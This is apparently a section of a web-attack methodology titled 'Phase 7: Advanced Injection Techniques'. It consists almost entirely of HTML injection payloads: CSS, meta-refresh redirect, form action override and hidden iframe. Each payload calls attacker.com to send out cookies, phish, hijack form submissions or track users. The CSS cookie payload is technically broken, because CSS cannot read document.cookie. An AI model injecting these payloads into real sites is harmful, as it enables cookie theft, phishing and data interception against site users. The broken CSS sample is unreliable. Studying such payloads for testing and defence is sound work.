# Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP bypass attempt -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

```html
<!-- Hijack existing form -->
<form action="http://attacker.com/steal">

<!-- If form already exists, add input -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```